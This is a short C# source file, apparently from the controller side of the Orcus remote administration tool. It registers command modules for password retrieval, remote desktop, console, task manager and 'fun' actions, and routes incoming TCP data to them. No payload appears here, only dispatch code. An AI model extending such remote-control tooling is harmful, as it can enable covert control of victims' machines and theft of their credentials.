using System;
using System.Threading;
using System.Collections.Generic;
using Orcus.Shared.Connection;
using System.Net.Sockets;
using System.Linq;

namespace Orcus.Administration.App
{
	public class Commander
	{
		public Commander(BaseClientInformation clientInfo, TcpClient tcpClient, Sender sender)
		{
			var connectionInfo = new ConnectionInfo(clientInfo, tcpClient, sender);
			Commands = new List<Command>
			{
				new FunCommand(),
				new TaskManagerCommand(),
				new PasswordCommand(),
				new ClientActionCommand(),
				new InternetCommand(),
				new ConsoleCommand(),
				new RemoteDesktopCommand()
			};

			Commands.ForEach(x => x.Initialize(connectionInfo));
		}

		public T GetCommand<T>() where T : Command
		{
			return Commands.OfType<T>().First();
		}

		public List<Command> Commands { get; private set; }

		public void Receive(uint id, byte[] data)
		{
			var command = Commands.FirstOrDefault(x => x.Identifier == id);
			if (command == null)
			{
				return;
			}

			new Thread(() => command.ResponseReceived(data)).Start();
		}
	}
}